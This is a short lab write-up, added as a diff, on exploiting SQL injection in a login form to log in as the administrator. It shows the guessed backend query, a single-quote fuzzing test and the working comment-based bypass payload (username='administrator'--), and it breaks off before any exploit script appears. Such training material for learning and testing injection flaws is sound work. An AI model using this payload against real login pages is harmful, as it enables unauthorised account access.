@@ -1,0 +1,27 @@
+SQL Injection Vulnerability - Login Functionality
+
+Objective: Perform SQLi attack and login as the administrator user
+
+*** Analysis ***
+
+We can deduce the backend query to look something like below:
+
+SELECT firstname FROM users_table WHERE username='admin' and password='admin'
+
+*** Exploitation
+
+- We can first fuzz the vulnerable functionality using common SQLi character as below
+
+SELECT firstname FROM users_table WHERE username=''' and password='admin'   #Output => "Internal Server Error"
+
+- Let's now try with a payload to attempt to login with as the admin user
+
+#Output => Failed, admin user doesn't seem to exist
+
+SELECT firstname FROM users_table WHERE username='admin'--' and password='admin'
+
+#Login Successful!
+
+SELECT firstname FROM users_table WHERE username='administrator'--' and password='admin'   
+
+Now over to scripting the exploit
